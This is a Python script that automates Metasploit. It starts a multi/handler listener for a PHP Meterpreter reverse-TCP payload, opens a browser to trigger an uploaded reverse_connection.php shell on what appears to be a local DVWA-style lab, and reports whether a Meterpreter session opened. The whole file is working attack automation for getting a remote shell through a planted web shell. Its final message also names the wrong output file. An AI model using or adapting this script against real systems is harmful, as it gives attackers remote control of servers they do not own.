import subprocess
import time
import webbrowser
import threading

# Metasploit command setup
msf_commands = """
use exploit/multi/handler
set lhost 192.168.64.132
set lport 4000
set payload php/meterpreter/reverse_tcp
exploit
"""

# Output file
output_file = "output_metasploit.txt"

# Flags
session_detected = False
handler_started = False
output_lines = []

# Function to read output in background thread
def read_output(process, output_lines, file_handle):
    while True:
        line = process.stdout.readline()
        if not line:
            break
        output_lines.append(line)
        file_handle.write(line)
        print(line, end='')

# Start Metasploit
with open(output_file, "w") as file:
    process = subprocess.Popen(
        ['msfconsole', '-q'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    # Send commands
    process.stdin.write(msf_commands + "\n")
    process.stdin.flush()

    # Start reading output in a thread
    output_thread = threading.Thread(target=read_output, args=(process, output_lines, file))
    output_thread.start()

    # Wait for reverse TCP handler
    timeout = time.time() + 30
    while time.time() < timeout:
        for line in output_lines:
            if "Started reverse TCP handler on 192.168.64.132:4000" in line:
                handler_started = True
                print("\n[+] Reverse TCP handler started! Opening browser...\n")
                webbrowser.get("firefox").open("http://localhost:8000/hackable/uploads/reverse_connection.php")
                break
        if handler_started:
            break
        time.sleep(1)

    if not handler_started:
        print("🚫 False Positive. [-] Reverse TCP handler did not start. Exiting.")
        process.stdin.write("exit\n")
        process.stdin.flush()
        process.terminate()
        output_thread.join()
        exit()

    # Wait for Meterpreter session
    print("\n[+] Waiting for Meterpreter session...\n")
    session_timeout = time.time() + 15
    while time.time() < session_timeout:
        for line in output_lines:
            if "Meterpreter session 1 opened" in line:
                session_detected = True
                break
        if session_detected:
            break
        time.sleep(1)

    # Outcome
    if session_detected:
        print("\n✅ True positive: Meterpreter session successfully opened.\n")
    else:
        print("\n🚫 False Positive. Session was not created. Exiting and saving output.\n")

    # Exit Metasploit
    process.stdin.write("exit\n")
    process.stdin.flush()
    time.sleep(2)
    process.terminate()
    output_thread.join()

print("\n[+] Metasploit execution completed. Output saved in metasploit_output.txt.")

